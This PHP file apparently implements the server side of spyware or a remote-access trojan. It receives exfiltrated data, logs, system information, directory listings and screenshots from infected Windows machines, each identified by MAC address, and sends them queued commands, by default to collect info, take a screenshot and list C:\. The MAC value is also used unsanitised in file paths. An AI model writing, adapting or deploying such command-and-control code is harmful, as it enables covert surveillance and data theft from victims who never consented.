<?php

if (!isset($_POST['mac'])) {
    die("No MAC");
}

$mac = $_POST['mac'];

$file_data = 'data/' . $mac;
$file_log  = 'log/' . $mac;
$file_cmds = 'commands/' . $mac;
$file_info = 'info/' . $mac;
$file_ls = 'ls/' . $mac;

$file_screenshots = 'screenshots/' . $mac;

$default_cmds = 'info;screenshot;ls C:\\';

if (isset($_POST['d'])) {
	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);

	if (file_exists($file_cmds)) {
		echo file_get_contents($file_cmds);
	} else {
		echo $default_cmds;
	}
	file_put_contents($file_cmds, '');
}
else if (isset($_POST['l'])) {
	file_put_contents($file_log,
		file_get_contents($file_log)
		. "[" . date("F d Y H:i:s", time())
		. "] " . $_POST['l'] . "\n");
}
else if (isset($_POST['i'])) {
	file_put_contents($file_info, $_POST['i']);
}
else if (isset($_POST['x'])) {
	file_put_contents($file_ls, $_POST['x']);
}
else if (isset($_FILES['s'])) {
	$uploadfile = $file_screenshots . '-' . time();
	move_uploaded_file($_FILES['s']['tmp_name'], $uploadfile);
}

?>
